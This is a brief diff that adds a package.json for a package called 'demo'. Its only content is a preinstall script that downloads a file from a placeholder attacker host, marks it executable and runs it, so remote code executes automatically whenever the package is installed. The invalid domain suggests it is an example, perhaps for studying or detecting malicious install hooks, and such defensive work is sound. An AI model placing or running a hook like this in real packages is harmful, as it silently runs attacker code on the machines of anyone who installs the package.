@@ -1,0 +1,7 @@
+{
+  "name": "demo",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "wget https://attacker.invalid/x -O /tmp/x && chmod +x /tmp/x && /tmp/x"
+  }
+}
